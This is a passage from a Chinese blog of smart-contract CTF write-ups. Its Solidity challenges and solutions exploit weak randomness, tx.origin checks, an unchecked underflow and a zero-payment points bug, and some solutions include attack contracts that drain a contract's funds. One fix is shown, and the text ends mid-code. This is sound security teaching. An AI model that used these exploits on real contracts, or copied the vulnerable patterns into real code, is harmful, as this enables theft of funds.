class="line">    mapping(address =&gt; bool) public flag;</span><br><span class="line"></span><br><span class="line">    // Constructor to initialize the mapping with the provided numbers</span><br><span class="line">    constructor(uint8[] memory numbers) &#123;</span><br><span class="line">        for (uint i = 0; i &lt; numbers.length; i++) &#123;</span><br><span class="line">            numberMapping[numbers[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to set the flag if the provided numbers are valid</span><br><span class="line">    function getflag() public &#123;</span><br><span class="line">        attackexample attack = attackexample(msg.sender);</span><br><span class="line">        uint8[] memory nums = attack.getNumbers();</span><br><span class="line"></span><br><span class="line">        // Check if any number in the provided array is in the mapping</span><br><span class="line">        require(isInArray(nums), &quot;You can&#x27;t do this&quot;);</span><br><span class="line">        flag[address(msg.sender)] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to check if any number in the input array exists in the mapping</span><br><span class="line">    function isInArray(uint8[] memory numbers) public view returns (bool) &#123;</span><br><span class="line">        for (uint i = 0; i &lt; numbers.length; i++) &#123;</span><br><span class="line">            if (numberMapping[numbers[i]]) return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attackexample &#123;</span><br><span class="line">    uint8[] public numbers;</span><br><span class="line"></span><br><span class="line">    // Function to return the numbers array</span><br><span class="line">    function getNumbers() public view returns (uint8[] memory) &#123;</span><br><span class="line">        return numbers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 在此填写你的攻击合约内容</span><br><span class="line">    // Paste your attack code here</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="第六题题解："><a href="#第六题题解：" class="headerlink" title="第六题题解："></a>第六题题解：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ArrayMapping &#123;</span><br><span class="line">    function getflag() external;</span><br><span class="line">    function flag(address _address) external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract demoattack &#123;</span><br><span class="line">    uint8[] public numbers;</span><br><span class="line">    ArrayMapping public targetContract;</span><br><span class="line"></span><br><span class="line">    constructor(address _targetAddress) &#123;</span><br><span class="line">        // Updated the list of primes, excluding the two largest ones</span><br><span class="line">        numbers = [197, 199, 211, 223, 227, 229]; </span><br><span class="line">        targetContract = ArrayMapping(_targetAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Function to retrieve the list of primes</span><br><span class="line">    function getNumbers() public view returns (uint8[] memory) &#123;</span><br><span class="line">        return numbers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Attack function to call the target contract&#x27;s getflag function</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        targetContract.getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Check success of the attack by calling the target contract&#x27;s flag function</span><br><span class="line">    function checkSuccess() public view returns (bool) &#123;</span><br><span class="line">        return targetContract.flag(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p>补全函数并部署，成功让flag返回true，成功提交截图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    // 1. 定义一个布尔类型的公共状态变量，命名为 `____(1)____`</span><br><span class="line">    ____(1)____ public flag;</span><br><span class="line"></span><br><span class="line">    // 2. 编写一个构造函数，接收支付的以太币金额，要求必须等于 1.5 ether</span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == ____(2)____, &quot;Invalid ether amount&quot;);</span><br><span class="line">        flag = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. 定义一个 `withdraw` 函数，要求调用者不能是外部账户（即不能是 `tx.origin`），并向调用者发送 1.5 ether</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender != ____(3)____, &quot;Fail&quot;);</span><br><span class="line">        (bool success, ) = ____(4)____(msg.sender).call&#123;value: ____(5)____&#125;(&quot;&quot;);</span><br><span class="line">        require(success == true, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 4. 定义一个 `solve` 函数，检查合约余额是否为 0，如果为 0，则设置 `flag` 为 `true`</span><br><span class="line">    function solve() public &#123;</span><br><span class="line">        require(___(6)___ == 0, &quot;Fail&quot;);</span><br><span class="line">        flag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BankAttack &#123;</span><br><span class="line">    // 5. 定义一个 `Bank` 类型的公共状态变量，命名为 `____(7)____`</span><br><span class="line">    ____(7)____ public targetBank;</span><br><span class="line"></span><br><span class="line">    // 6. 编写一个构造函数，接收目标银行的地址并实例化 `targetBank`</span><br><span class="line">    constructor(address _bankAddress) &#123;</span><br><span class="line">        targetBank = ____(8)____(_bankAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attackWithdraw() public &#123;</span><br><span class="line">        targetBank.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第七题题解"><a href="#第七题题解" class="headerlink" title="第七题题解"></a>第七题题解</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Bank &#123;</span><br><span class="line">    bool public flag;</span><br><span class="line"></span><br><span class="line">    // Constructor that accepts a specific amount of Ether and sets the flag to false</span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value == (15 * 1 ether) / 10, &quot;Incorrect amount of Ether sent&quot;);</span><br><span class="line">        flag = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Withdraw function to ensure only contract calls are allowed (no EOAs)</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender != tx.origin, &quot;Fail: External accounts are not allowed&quot;);</span><br><span class="line">        </span><br><span class="line">        (bool success, ) = payable(msg.sender).call&#123;value: (15 * 1 ether) / 10&#125;(&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">        require(success, &quot;Transaction failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Solve function that sets the flag to true when the contract balance is 0</span><br><span class="line">    function solve() public &#123;</span><br><span class="line">        require(address(this).balance == 0, &quot;Fail: Contract balance must be 0&quot;);</span><br><span class="line">        flag = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><p>通关条件：check函数返回true</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">contract war &#123;</span><br><span class="line">mapping(address =&gt; bool) player;</span><br><span class="line">uint256 warrior = 0;</span><br><span class="line">uint256 archer = 1;</span><br><span class="line">uint256 assassin = 2;</span><br><span class="line"></span><br><span class="line">function randomArmy() internal view returns (uint256) &#123;</span><br><span class="line">    return (uint256(keccak256(abi.encodePacked(block.timestamp))) % 3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function respond(uint256 yours) external &#123;</span><br><span class="line">    uint256 randomarmy = randomArmy();</span><br><span class="line">    if (yours == 0 &amp;&amp; randomarmy == 2) &#123;</span><br><span class="line">        player[msg.sender] = true;</span><br><span class="line">    &#125; else if (yours == 1 &amp;&amp; randomarmy == 0) &#123;</span><br><span class="line">        player[msg.sender] = true;</span><br><span class="line">    &#125; else if (yours == 2 &amp;&amp; randomarmy == 1) &#123;</span><br><span class="line">        player[msg.sender] = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check(address _add) external view returns (bool) &#123;</span><br><span class="line">    return player[_add];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="第八题题解"><a href="#第八题题解" class="headerlink" title="第八题题解"></a>第八题题解</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">interface Iwar &#123;</span><br><span class="line">    // Respond function, takes a uint256 parameter</span><br><span class="line">    function respond(uint256 yours) external;</span><br><span class="line"></span><br><span class="line">    // Check function, returns a boolean for the address</span><br><span class="line">    function check(address) external view returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract warhack &#123;</span><br><span class="line">    Iwar public add;</span><br><span class="line"></span><br><span class="line">    // Constructor to initialize the contract with the target address</span><br><span class="line">    constructor(Iwar _add) &#123;</span><br><span class="line">        add = _add;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Hack function that continuously calls the respond function</span><br><span class="line">    // until the check function returns true</span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        // Infinite loop, runs until check() returns true</span><br><span class="line">        while (!add.check(address(this))) &#123;</span><br><span class="line">            add.respond(0); // Respond with 0 to the target contract</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









]]></content>
      <tags>
        <tag>合约审计</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次题解02</title>
    <url>/2025/05/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A2%98%E8%A7%A302/</url>
    <content><![CDATA[<h2 id="1-充电宝"><a href="#1-充电宝" class="headerlink" title="1.充电宝"></a>1.充电宝</h2><h4 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line">//一个新型共享充电宝租借系统，整点动静，给粗心的项目方一点小小的震撼</span><br><span class="line"></span><br><span class="line">//复制粘贴到remix本地测试即可，不改变代码的情况下，调用falg函数返回true视为成功</span><br><span class="line">contract PowerBankRental &#123;</span><br><span class="line">    uint256 public totalUnits = 5; //记录实际有多少个充电宝</span><br><span class="line">    mapping(address =&gt; uint) public deposits; </span><br><span class="line"></span><br><span class="line">    function rent() external payable &#123;</span><br><span class="line">        require(msg.value == 1 ether, &quot;Need 1 ETH&quot;); </span><br><span class="line"></span><br><span class="line">        require(totalUnits &gt;= 0, &quot;Out of stock&quot;);</span><br><span class="line"></span><br><span class="line">        unchecked&#123;</span><br><span class="line">        totalUnits--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        deposits[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function returnAll() external &#123;</span><br><span class="line">        require(deposits[msg.sender] &gt; 0, &quot;No deposit&quot;);</span><br><span class="line"></span><br><span class="line">        totalUnits++;</span><br><span class="line"></span><br><span class="line">        uint256 amount = deposits[msg.sender];</span><br><span class="line">        deposits[msg.sender] = 0;</span><br><span class="line"></span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;); </span><br><span class="line">        require(success, &quot;Refund failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function falg(address attacker) external view returns (bool) &#123;</span><br><span class="line">        return (totalUnits &gt;= 5 &amp;&amp; deposits[attacker] &gt; 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="我的解题"><a href="#我的解题" class="headerlink" title="我的解题"></a>我的解题</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*首先看原代码看到了显目的unchecked</span><br><span class="line"></span><br><span class="line"> unchecked&#123;</span><br><span class="line">        totalUnits--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  然后看falg函数返回“true”的条件：</span><br><span class="line">totalUnits &gt;= 5 &amp;&amp; deposits[attacker] &gt; 0</span><br><span class="line">	</span><br><span class="line">	则要尝试让数量一直大于5且一直有押金在</span><br><span class="line">	对于第一个 因为有uncheck，直接调用rent()超过5次即可使这个表示数量的参数下滥，然后它就变成极大值就一直满足第一个条件了;</span><br><span class="line">	对于第二个，我想法是有钱就行，那就前五次调用后都归还（return.All()）（归还就是2^256-1+5，还是很大），然后最后再调用rent,这样表示数量的参又大于5，付给系统的租金也不是0（&gt;0）</span><br><span class="line">	</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>Account切换不同账号来借充电宝：</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250417161700489.png" alt="image-20250417161700489"></p>
<p>变成0后再借一次，就会发现：</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250417161740648.png" alt="image-20250417161740648"></p>
<p>前面5个账号再分别returnAll()退掉</p>
<p>然后在flag那里输入我rent()时的地址</p>
<p>可得：</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250417162134663.png" alt="image-20250417162134663"></p>
<h4 id="攻击合约："><a href="#攻击合约：" class="headerlink" title="攻击合约："></a><strong>攻击合约：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    PowerBankRental target;</span><br><span class="line">    uint256 counter;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = PowerBankRental(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external payable &#123;</span><br><span class="line">    for (uint i = 0; i &lt; 6; i++) &#123;</span><br><span class="line">        target.rent&#123;value: 1 ether&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-LoyaltyProgram"><a href="#2-LoyaltyProgram" class="headerlink" title="2. LoyaltyProgram"></a>2. LoyaltyProgram</h2><h4 id="题：-1"><a href="#题：-1" class="headerlink" title="题："></a><strong>题</strong>：</h4><p>你发现了一个“忠诚计划”合约 LoyaltyProgram，它奖励用户通过支付 ETH 来积累“忠诚点数”（loyaltyPoints）。当你的点数达到一定值时，你将被认证为“忠诚会员”，并解锁特殊权限。</p>
<p>请在remix上部署<code>LoyaltyProgram</code>合约时存入 1 ehter 为起始资金。</p>
<p><strong>挑战目标：</strong></p>
<p>将 isCertified 设置为 true。并提取合约中所有资金。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract LoyaltyProgram &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public loyaltyPoints; </span><br><span class="line">    mapping(address =&gt; uint256) public lastPaymentTime; </span><br><span class="line">    bool public isCertified;                         </span><br><span class="line">    uint256 public constant TARGET_POINTS = 4;        </span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public totalFunds;                        </span><br><span class="line"></span><br><span class="line">    event Payment(address indexed payer, uint256 amount);</span><br><span class="line">    event PointsEarned(address indexed member, uint256 points);</span><br><span class="line">    event Certified(address indexed member);</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1 ether, &quot;Program requires 1 ETH to start&quot;);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        totalFunds = msg.value;</span><br><span class="line">        isCertified = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payLoyaltyFee() external payable &#123;</span><br><span class="line">        require(!isCertified, &quot;Program already certified!&quot;);</span><br><span class="line"></span><br><span class="line">        totalFunds = address(this).balance;</span><br><span class="line"></span><br><span class="line">        uint256 payment = msg.value;</span><br><span class="line">        lastPaymentTime[msg.sender] = block.timestamp;</span><br><span class="line"></span><br><span class="line">        if (payment &gt;= 0.5 ether) &#123;</span><br><span class="line">            loyaltyPoints[msg.sender] += payment / 0.5 ether; </span><br><span class="line">        &#125; else if (payment &gt; 0 &amp;&amp; payment &lt; 0.5 ether) &#123;</span><br><span class="line">            loyaltyPoints[msg.sender] += 1;</span><br><span class="line">        &#125; else if (totalFunds &gt; 0 &amp;&amp; lastPaymentTime[msg.sender] &gt; 0) &#123;</span><br><span class="line">            loyaltyPoints[msg.sender] += 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit Payment(msg.sender, payment);</span><br><span class="line">        emit PointsEarned(msg.sender, loyaltyPoints[msg.sender]);</span><br><span class="line"></span><br><span class="line">        if (loyaltyPoints[msg.sender] &gt;= TARGET_POINTS) &#123;</span><br><span class="line">            isCertified = true;</span><br><span class="line">            emit Certified(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function claimReward() external &#123;</span><br><span class="line">        require(isCertified, &quot;Not certified yet&quot;);</span><br><span class="line">        require(loyaltyPoints[msg.sender] &gt;= TARGET_POINTS, &quot;Not enough points&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 reward = address(this).balance;</span><br><span class="line">        totalFunds = 0;</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: reward&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getPoints(address member) external view returns (uint256) &#123;</span><br><span class="line">        return loyaltyPoints[member];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 接收 ETH 的回调</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        totalFunds += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="我的解题："><a href="#我的解题：" class="headerlink" title="我的解题："></a>我的解题：</h4><p>首先 1ether开始</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250417211359522.png" alt="image-20250417211359522"></p>
<p>然后阅读代码，结合题意的文字描述，大概是积分大于等于四分就是会员了；</p>
<p>然后是了解这个加分机制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (payment &gt;= 0.5 ether) &#123;</span><br><span class="line">          loyaltyPoints[msg.sender] += payment / 0.5 ether; </span><br><span class="line">        &#125; </span><br><span class="line">//支付大于等于 0.5 ETH时，1ETH = 2分</span><br><span class="line">        </span><br><span class="line">        else if (payment &gt; 0 &amp;&amp; payment &lt; 0.5 ether) &#123;</span><br><span class="line">    loyaltyPoints[msg.sender] += 1;</span><br><span class="line">        &#125; </span><br><span class="line">//支付0-0.5个时，就是1分        </span><br><span class="line">        </span><br><span class="line">        else if (totalFunds &gt; 0 &amp;&amp; lastPaymentTime[msg.sender] &gt; 0) &#123;</span><br><span class="line">            loyaltyPoints[msg.sender] += 1; //这个我理解的是 当你之前支付过一次后，如果你再来用0ETH调用一下（类似于签到？），还是给你加一分</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>那么现在的目的应该是用最少的eth达到会员然后再把钱取走。</p>
<p>我的思路是：第一次先支付很少很少（1 wei），然后后期一直调用 <code>payLoyaltyFee()</code> 发送 0 ETH三次 ，来得到四分，从而获得奖励。</p>
<p><strong>第一步</strong></p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250418180936172.png" alt="image-20250418180936172"></p>
<p><strong>第二步</strong>  0wei调用三次payLoyaltyFee()</p>
<p><strong>第三步</strong> </p>
<p>填上调用者地址 然后看这两个函数  应该就可以了、</p>
<p><img src="C:\Users\eightjiu\AppData\Roaming\Typora\typora-user-images\image-20250418181249634.png" alt="image-20250418181249634"></p>
<h4 id="攻击合约：-1"><a href="#攻击合约：-1" class="headerlink" title="攻击合约："></a><strong>攻击合约：</strong></h4><ul>
<li><code>payLoyaltyFee()</code>函数没有验证支付金额（<code>msg.value</code>），允许攻击者通过发送0 ETH多次调用来积累忠诚度。</li>
<li>该条件分支 **没有检查 <code>msg.value &gt; 0</code>**，这是致命漏洞</li>
<li>逻辑错误：应该用 <strong><code>payment &gt; 0</code></strong> 而非 <code>totalFunds &gt; 0</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">// 忠诚度计划接口</span><br><span class="line">interface ILoyaltyProgram &#123;</span><br><span class="line">    function payLoyaltyFee() external payable;  // 支付忠诚度费用</span><br><span class="line">    function loyaltyPoints(address member) external view returns (uint256); // 查询忠诚度点数</span><br><span class="line">    function isCertified() external view returns (bool); // 检查是否认证</span><br><span class="line">    function claimReward() external; // 领取奖励</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract LoyaltyExploit &#123;</span><br><span class="line">    ILoyaltyProgram public target; // 目标 LoyaltyProgram 合约地址</span><br><span class="line">    address public attacker;       // 攻击者地址</span><br><span class="line">    uint256 public constant REQUIRED_CALLS = 5; // 需要调用5次触发漏洞</span><br><span class="line"></span><br><span class="line">    event ExploitSuccess(address indexed attacker, uint256 points); // 攻击成功事件</span><br><span class="line"></span><br><span class="line">    // 构造函数：初始化目标合约和攻击者地址</span><br><span class="line">    constructor(address _target) &#123;</span><br><span class="line">        target = ILoyaltyProgram(_target); // 设置目标合约</span><br><span class="line">        attacker = msg.sender; // 设置攻击者为部署者</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 攻击函数：通过多次调用payLoyaltyFee利用漏洞</span><br><span class="line">    function exploit() external &#123;</span><br><span class="line">        require(msg.sender == attacker, &quot;Only attacker can exploit&quot;); // 只有攻击者能调用</span><br><span class="line"></span><br><span class="line">        // 循环调用5次payLoyaltyFee（不发送ETH）</span><br><span class="line">        for (uint256 i = 0; i &lt; REQUIRED_CALLS; i++) &#123;</span><br><span class="line">            target.payLoyaltyFee&#123;value: 0&#125;(); // 关键漏洞利用点：免费增加忠诚度</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 验证攻击是否成功</span><br><span class="line">        uint256 finalPoints = target.loyaltyPoints(address(this)); // 获取当前合约的忠诚度</span><br><span class="line">        require(finalPoints &gt;= 4, &quot;Failed to reach target points&quot;); // 确保点数足够</span><br><span class="line">        require(target.isCertified(), &quot;Certification not achieved&quot;); // 确保获得认证</span><br><span class="line"></span><br><span class="line">        emit ExploitSuccess(attacker, finalPoints); // 触发成功事件</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 提取奖励函数</span><br><span class="line">    function withdrawReward() external &#123;</span><br><span class="line">        require(msg.sender == attacker, &quot;Only attacker can withdraw&quot;); // 只有攻击者能提取</span><br><span class="line">        </span><br><span class="line">        // 从目标合约领取奖励（可能包含ETH）</span><br><span class="line">        target.claimReward(); </span><br><span class="line"></span><br><span class="line">        // 将合约内的ETH转给攻击者</span><br><span class="line">        uint256 balance = address(this).balance;</span><br><span class="line">        if (balance &gt; 0) &#123;</span><br><span class="line">            (bool success, ) = attacker.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">            require(success, &quot;Transfer to attacker failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 接收ETH的回退函数</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>为什么不需要转入那1wei:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lastPaymentTime[msg.sender] = block.timestamp; // 每次调用都会更新！</span><br></pre></td></tr></table></figure>

<p><code>payLoyaltyFee()</code>函数中<strong>无条件更新</strong>了<code>lastPaymentTime</code></p>
<ul>
<li>这个赋值操作<strong>发生在条件判断之前</strong></li>
<li>因此即使是0 ETH调用，也会先记录时间戳，使后续检查<code>lastPaymentTime &gt; 0</code>永远为真</li>
</ul>
<p><strong>攻击流程解析：</strong></p>
<ol>
<li><strong>第一次调用</strong>（<code>value=0</code>）：<ul>
<li>先执行：<code>lastPaymentTime[攻击合约] = block.timestamp</code>（设为当前时间）</li>
<li>然后检查条件：<ul>
<li><code>payment == 0</code> → 跳过第一个条件</li>
<li><code>payment &lt; 0.5 ether</code> → 跳过第二个条件</li>
<li><code>totalFunds &gt; 0 &amp;&amp; lastPaymentTime &gt; 0</code> → <strong>满足！</strong>（因为时间戳刚被设置）</li>
</ul>
</li>
<li>结果：获得1点</li>
</ul>
</li>
<li><strong>后续调用</strong>：<ul>
<li>每次都会重复上述过程，因为时间戳始终被更新</li>
</ul>
</li>
</ol>
<h4 id="修改漏洞："><a href="#修改漏洞：" class="headerlink" title="修改漏洞："></a>修改漏洞：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function payLoyaltyFee() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0, &quot;Payment required&quot;); // 必须添加的防护</span><br><span class="line">    </span><br><span class="line">    uint256 payment = msg.value;</span><br><span class="line">    totalFunds += payment;</span><br><span class="line">    </span><br><span class="line">    // 先进行条件判断</span><br><span class="line">    if (payment &gt;= 0.5 ether) &#123;</span><br><span class="line">        loyaltyPoints[msg.sender] += payment / 0.5 ether;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        loyaltyPoints[msg.sender] += 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 最后更新时间戳</span><br><span class="line">    lastPaymentTime[msg.sender] = block.timestamp;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="漏洞本质："><a href="#漏洞本质：" class="headerlink" title="漏洞本质："></a>漏洞本质：</h4><p>这是典型的<strong>执行顺序漏洞</strong>，关键问题在于：</p>
<ol>
<li>时间戳更新操作放在了条件判断之前</li>
<li>没有对<code>msg.value == 0</code>的情况做防护</li>
</ol>
<h2 id="3-签名"><a href="#3-签名" class="headerlink" title="3.签名"></a>3.签名</h2><h4 id="题：-2"><a href="#题：-2" class="headerlink" title="题："></a><strong>题：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.28;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//备注，此合约地址为部署者地址，每次做题前，请用部署者合约的deploy函数来部署自己的题目地址</span><br><span class="line">//请勿提交相同答案，不然算抄袭</span><br><span class="line">//0xD5bc07F7c1d70f720Fe1C586EbD9a942F6689B68</span><br><span class="line">//通过条件，有个isSolved函数，返回true即可</span><br><span class="line">contract Deployer &#123;</span><br><span class="line">    address[] public deployed;</span><br><span class="line">    </span><br><span class="line">    event ChallengeDeployed(address indexed challengeAddress);</span><br><span class="line">    </span><br><span class="line">    function deploy() external returns (address) &#123;</span><br><span class="line">        challenge newChallenge = new challenge();</span><br><span class="line">        address challengeAddress = address(newChallenge);</span><br><span class="line">        deployed.push(challengeAddress);</span><br><span class="line">        emit ChallengeDeployed(challengeAddress);</span><br><span class="line">        return challengeAddress;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getDeployedCount() external view returns (uint256) &#123;</span><br><span class="line">        return deployed.length;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function getAllDeployed() external view returns (address[] memory) &#123;</span><br><span class="line">        return deployed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved(address _address) public view returns (bool) &#123;</span><br><span class="line">        for (uint256 i = 0; i &lt; deployed.length; i++) &#123;</span><br><span class="line">            if (challenge(deployed[i]).isSolved(_address)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract challenge &#123;</span><br><span class="line">    struct Message &#123;</span><br><span class="line">        uint8 v;</span><br><span class="line">        bytes32 r;</span><br><span class="line">        bytes32 s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    address csl;</span><br><span class="line">    bytes32 alreadyUsedMessageHash;</span><br><span class="line">    mapping(address =&gt; bool) public isCompleted;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function isSolved(address _address) public view returns (bool) &#123;</span><br><span class="line">        return isCompleted[_address];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMessageHash(address _csl) public view returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(&quot;I want to open the magic box&quot;, _csl, address(this), block.chainid));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _getSignerAndMessageHash(Message memory _message) internal view returns (address, bytes32) &#123;</span><br><span class="line">        address signer = ecrecover(getMessageHash(msg.sender), _message.v, _message.r, _message.s);</span><br><span class="line">        bytes32 messageHash = keccak256(abi.encodePacked(_message.v, _message.r, _message.s));</span><br><span class="line">        return (signer, messageHash);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function toSign(Message memory message) external &#123;</span><br><span class="line">        require(csl == address(0), &quot;CSL already signed in&quot;);</span><br><span class="line">        (address signer, 